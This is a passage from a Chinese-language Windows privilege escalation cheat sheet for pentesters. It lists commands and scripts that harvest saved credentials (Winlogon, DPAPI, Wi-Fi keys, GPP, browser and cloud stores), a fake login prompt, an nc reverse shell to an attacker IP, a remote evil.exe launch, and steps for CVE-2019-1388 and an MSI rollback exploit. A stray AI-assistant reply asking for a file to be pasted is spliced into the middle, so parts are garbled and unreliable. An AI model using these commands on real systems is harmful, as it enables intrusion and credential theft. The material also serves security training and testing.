netstat -ano #Opened ports?
```
### 路由表
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 表
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 防火墙规则

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(列出规则、创建规则、关闭、关闭...)**

更多[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
二进制 `bash.exe` 也可以在 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` 中找到

如果你获得 root 用户，你可以监听任何端口（第一次使用 `nc.exe` 在端口上监听时，GUI 会询问是否允许 `nc` 通过防火墙）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
要轻松以 root 启动 bash，可以尝试 `--default-user root`

您可以在文件夹 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 中浏览 `WSL` 文件系统

## Windows 凭据

### Winlogon 凭据
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 凭据管理器 / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault 存储用于服务器、网站和其他程序的用户凭据，这些凭据可以被 **Windows** **自动为用户登录**。乍一看，用户可能认为可以在此存储他们的 Facebook、Twitter、Gmail 等凭据，从而通过浏览器自动登录。但事实并非如此。

Windows Vault 存储那些可以被 Windows 自动登录的凭据，这意味着任何 **需要凭据来访问资源的 Windows 应用程序**（服务器或网站）**可以使用这个 Credential Manager** 和 Windows Vault，使用所提供的凭据，而不是让用户每次输入用户名和密码。

除非应用程序与 Credential Manager 交互，否则我认为它们不可能使用某个资源的凭据。因此，如果你的应用程序想使用 vault，它应该以某种方式**与 credential manager 通信并从默认存储 vault 请求该资源的凭据**。

使用 `cmdkey` 列出机器上存储的凭据。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
然后你可以使用 `runas` 并加上 `/savecred` 选项来使用已保存的凭据。下面的例子通过 SMB share 调用远程 binary。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
使用提供的一组凭据运行 `runas`。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
请注意：mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)，或来自 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)。

### DPAPI

The **Data Protection API (DPAPI)** provides a method for symmetric encryption of data, predominantly used within the Windows operating system for the symmetric encryption of asymmetric private keys. This encryption leverages a user or system secret to significantly contribute to entropy.

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. In scenarios involving system encryption, it utilizes the system's domain authentication secrets.

使用 DPAPI 加密的用户 RSA 密钥存储在 `%APPDATA%\Microsoft\Protect\{SID}` 目录中，其中 `{SID}` 表示用户的 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)。**DPAPI 密钥与同一文件中保护用户私钥的主密钥共存**，通常由 64 字节的随机数据组成。（需要注意的是，对该目录的访问受到限制，无法通过 CMD 中的 `dir` 命令列出其内容，但可以通过 PowerShell 列出。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
你可以使用 **mimikatz module** `dpapi::masterkey` 并带上适当的参数（`/pvk` 或 `/rpc`）来解密它。

**由主密码保护的凭据文件**通常位于：
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
你可以使用 **mimikatz module** `dpapi::cred` 并配合相应的 `/masterkey` 来 decrypt.\
你可以使用 `sekurlsa::dpapi` 模块 **extract many DPAPI** **masterkeys** 从 **memory** 中（如果你是 root）。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** 经常用于 **scripting** 和自动化任务，作为一种便捷的方式来存储 encrypted credentials。 这些 credentials 使用 **DPAPI** 保护，通常意味着它们只能被创建它们的同一用户在同一台计算机上 decrypt。

要从包含它的文件中 **decrypt** 一个 PS credentials，你可以执行：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Saved RDP Connections

你可以在 `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
和 `HKCU\Software\Microsoft\Terminal Server Client\Servers\` 找到它们。

### 最近运行的命令
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **远程桌面凭证管理器**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
使用 **Mimikatz** 的 `dpapi::rdg` 模块并使用适当的 `/masterkey` 来**解密任何 .rdg 文件**`\
可以使用 **Mimikatz** 的 `sekurlsa::dpapi` 模块从内存中**提取大量 DPAPI masterkeys**

### Sticky Notes

很多人在 Windows 工作站上使用 StickyNotes 应用来**保存密码**和其他信息，却没有意识到它是一个数据库文件。该文件位于 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`，始终值得查找和检查。

### AppCmd.exe

**注意：要从 AppCmd.exe 恢复密码，你需要以 管理员 身份 并在 高完整性 级别 下运行。**\
**AppCmd.exe** 位于 `%systemroot%\system32\inetsrv\` 目录。\
如果该文件存在，则可能已配置了某些 **credentials**，并且可以**恢复**。

此代码摘自 [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

检查是否存在 `C:\Windows\CCM\SCClient.exe` .\
安装程序以 **run with SYSTEM privileges**, 许多易受 **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 文件和注册表 (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 主机密钥
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 注册表中的 SSH 私钥

SSH 私钥可以存储在注册表键 `HKCU\Software\OpenSSH\Agent\Keys` 中，因此您应该检查那里是否有任何有趣的内容：
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
如果在该路径中发现任何条目，它可能是保存的 SSH 密钥。它以加密形式存储，但可以使用 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) 轻松解密。\

有关此技术的更多信息： [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

如果 `ssh-agent` 服务未运行且您希望它在启动时自动启动，请运行：
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 该技术似乎已不再有效。我尝试创建一些 ssh 密钥，使用 `ssh-add` 添加它们，并通过 ssh 登录到一台机器。注册表 HKCU\Software\OpenSSH\Agent\Keys 不存在，procmon 在进行非对称密钥认证时也未检测到对 `dpapi.dll` 的使用。

### 无人值守的文件
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
你也可以使用 **metasploit** 来搜索这些文件：_post/windows/gather/enum_unattend_

示例内容:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 备份
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 云凭证
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Search for a file called **SiteList.xml**

### 已缓存的 GPP 密码

以前有一项功能允许通过 Group Policy Preferences (GPP) 在一组计算机上部署自定义本地管理员账户。然而，该方法存在严重的安全缺陷。首先，作为 XML 文件存储在 SYSVOL 中的 Group Policy Objects (GPOs) 可以被任何域用户访问。其次，这些 GPP 中的密码使用公开记录的默认密钥通过 AES256 加密，任何经过身份验证的用户都可以解密。这带来了严重风险，因为它可能允许用户获取提权权限。

为减轻此风险，开发了一个函数，用于扫描本地缓存的包含非空 "cpassword" 字段的 GPP 文件。找到此类文件后，函数会解密密码并返回一个自定义 PowerShell 对象。该对象包含有关 GPP 及其文件位置的详细信息，有助于识别和修复此安全漏洞。

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**要解密 cPassword：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
使用 crackmapexec 获取密码：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web 配置
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
带凭据的 web.config 示例：
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 凭据
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 日志
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 询问 credentials

你可以随时**要求用户输入他的 credentials，甚至是另一个用户的 credentials**，如果你认为他可能知道它们（注意，直接向客户端**询问**这些 **credentials** 是非常**危险**的）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **可能包含 credentials 的文件名**

已知曾经包含 **passwords**（以 **clear-text** 或 **Base64** 存储）的文件
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
我无法直接访问你的文件系统或代码仓库。请把 src/windows-hardening/windows-local-privilege-escalation/README.md 的内容（或你想要我翻译的所有文件内容）粘贴到这里，我会按你的要求把其中的英语文本翻译成中文，保持原有的 markdown/HTML 语法、路径、标签和代码不变，并遵守不翻译特定词汇的规则。
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### 回收站中的凭据

你还应该检查回收站以查找其中的凭据

要 **恢复由多个程序保存的密码**，可以使用： [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 在注册表中

**其他可能包含凭据的注册表键**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**从注册表提取 openssh 密钥。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 浏览器历史

你应该检查存放 **Chrome or Firefox** 密码的数据库。  
也要检查浏览器的历史、书签和收藏夹，因为某些 **密码** 可能就存放在那里。

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL 覆写**

Component Object Model (COM) 是内置于 Windows 操作系统的一项技术，允许不同语言的软件组件之间进行互相通信。每个 COM 组件通过 class ID (CLSID) 来标识，每个组件通过一个或多个接口暴露功能，这些接口由 interface IDs (IIDs) 标识。

COM 类和接口在注册表的 **HKEY\CLASSES\ROOT\CLSID** 和 **HKEY\CLASSES\ROOT\Interface** 下定义。该注册表由 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** 合并生成，等于 **HKEY\CLASSES\ROOT**。

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (单线程), **Free** (多线程), **Both** (单或多线程) or **Neutral** (线程中性).

![](<../../images/image (729).png>)

基本上，如果你能 **overwrite any of the DLLs**，并且这些 DLL 将被执行，那么如果该 DLL 被不同用户执行，你就能够 **escalate privileges**。

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **文件和注册表中的通用密码搜索**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**搜索具有特定文件名的文件**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**在注册表中搜索键名和密码**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 搜索 passwords 的工具

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **是一个 msf 插件**，我创建此插件以 **自动执行每个在受害者系统中搜索 credentials 的 metasploit POST module**。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 会自动搜索本页提到的所有包含 passwords 的文件。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 是另一个很好的工具，用于从系统中提取 password。

工具 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 会搜索多个将这些数据以明文保存的工具的 **sessions**、**usernames** 和 **passwords**（PuTTY、WinSCP、FileZilla、SuperPuTTY 和 RDP）。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

设想 **一个以 SYSTEM 身份运行的进程使用** `OpenProcess()` **打开了一个新进程** 并且具有 **完全访问权限**。同一进程 **也使用** `CreateProcess()` **创建了一个权限较低但继承了主进程所有打开句柄的新进程**。\
然后，如果你对该低权限进程拥有 **完全访问权限**，你可以获取用 `OpenProcess()` 打开的特权进程的 **打开句柄** 并 **注入 shellcode**。\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

被称为 **pipes** 的共享内存段允许进程间通信和数据传输。

Windows 提供了名为 **Named Pipes** 的功能，允许不相关的进程共享数据，甚至跨网络。这类似于客户端/服务器架构，角色定义为 **named pipe server** 和 **named pipe client**。

当数据由 **client** 通过 pipe 发送时，设置该 pipe 的 **server** 在拥有必要的 **SeImpersonate** 权限时可以 **采用 client 的身份**。识别一个通过你可以模仿的 pipe 与之通信的 **privileged process**，一旦该进程与您建立的 pipe 交互，就可以通过采用该进程的身份来 **提升权限**。有关执行此类攻击的说明，可在 [**here**](named-pipe-client-impersonation.md) 和 [**here**](#from-high-integrity-to-system) 找到有用的指南。

此外，以下工具允许使用像 burp 这样的工具 **拦截 named pipe 通信：** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **而这个工具允许列出并查看所有 pipes 来查找 privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## 杂项

### 可能在 Windows 中执行代码的文件扩展名

查看页面 **[https://filesec.io/](https://filesec.io/)**

### **监控命令行中的密码**

当以用户身份获得 shell 时，可能存在计划任务或其他正在执行的进程会在 **命令行上传递凭据**。下面的脚本每两秒捕获一次进程的命令行，并将当前状态与之前的状态进行比较，输出任何差异。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 从进程窃取密码

## 从低权限用户到 NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

如果你可以访问图形界面（通过 console 或 RDP），并且 UAC 已启用，那么在某些版本的 Microsoft Windows 中，从非特权用户可以运行终端或其他任何进程，例如 "NT\AUTHORITY SYSTEM"。

这使得可以利用同一漏洞同时提升权限并绕过 UAC。此外，无需安装任何东西，过程中使用的二进制文件由 Microsoft 签名并发布。

以下是一些受影响的系统：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
要利用此漏洞，需要执行以下步骤：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## 从 Administrator Medium 到 High Integrity Level / UAC Bypass

阅读此处以了解 Integrity Levels：


{{#ref}}
integrity-levels.md
{{#endref}}

然后阅读此处以了解 UAC 和 UAC bypasses：


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

该技术在这篇[**blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) 中描述，相关 exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。

该攻击基本上是滥用 Windows Installer 的 rollback 功能，在卸载过程中将合法文件替换为恶意文件。为此，攻击者需要创建一个 **malicious MSI installer**，用于劫持 `C:\Config.Msi` 文件夹，Windows Installer 在卸载其他 MSI 包时会将 rollback 文件存放到该文件夹，而这些 rollback 文件随后会被修改为包含恶意负载。

该方法总结如下：

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- 创建一个 `.msi`，将一个无害文件（例如 `dummy.txt`）安装到一个可写文件夹（`TARGETDIR`）。
- 将安装程序标记为 **"UAC Compliant"**，以便 **非管理员用户** 可以运行它。
- 安装后保持对该文件的一个 **handle** 打开。

- Step 2: Begin Uninstall
- 卸载同一个 `.msi`。
- 卸载过程开始将文件移动到 `C:\Config.Msi` 并将它们重命名为 `.rbf` 文件（rollback 备份）。
- 使用 `GetFinalPathNameByHandle` **轮询打开的文件句柄**，以检测该文件何时变为 `C:\Config.Msi\<random>.rbf`。

- Step 3: Custom Syncing
- 该 `.msi` 包含一个 **custom uninstall action (`SyncOnRbfWritten`)**，该动作：
- 在 `.rbf` 被写入时发送信号。
- 然后在继续卸载前 **等待** 另一个事件。

- Step 4: Block Deletion of `.rbf`
- 在接收到信号后，**以不包含 `FILE_SHARE_DELETE` 的方式打开 `.rbf` 文件** — 这会**阻止其被删除**。
- 然后**回传信号**，以便卸载可以完成。
- Windows Installer 无法删除该 `.rbf`，因为它无法删除所有内容，**`C:\Config.Msi` 将不会被移除**。

- Step 5: Manually Delete `.rbf`
